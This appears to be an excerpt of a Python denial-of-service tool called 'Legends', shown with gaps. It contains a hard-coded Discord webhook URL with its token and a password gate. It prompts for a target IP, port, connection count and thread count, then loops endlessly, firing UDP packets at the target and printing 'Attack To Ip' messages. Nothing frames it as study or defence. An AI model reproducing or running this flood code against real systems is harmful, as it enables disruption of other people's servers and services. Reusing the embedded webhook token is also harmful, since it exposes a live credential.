...
webhook_url = "https://discord.com/api/webhooks/946279740979961866/XhAQXd3a_s7p_rcOe_MULrd4i_eCxyQs72b8NLl0e-PChV3zOr1rM3Jovl6elb1Sc0Eg"
...
for i in range(3):
	...
	if(pwd==password):
		...
		continue
time.sleep(5)
print("[+] Done Use Account \u001b[33mLegends™")
time.sleep(5)
...
ip = str(input("   \u001b[31m[X] \u001b[37m@Legends ════> Ip/Host :\u001b[31m  "))
time.sleep(3)
print(" ")
port = int(input("   \u001b[31m[Y] \u001b[37m@Legends ════> Port Server :\u001b[31m  "))
print(" ")
times = int(input("   \u001b[31m[Z] \u001b[37m@Legends ════> Connections :\u001b[31m  "))
print(" ")
threads = int(input("   \u001b[31m[X] \u001b[37m@Legends ════> Threading :\u001b[31m  "))
time.sleep(3)
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(f"\u001b[33m [¥] @Legends ════> \u001b[31mAttack To Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")
		except:
			print(f"\u001b[33m [¥] @Legends ════> \u001b[31mAttack To Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")
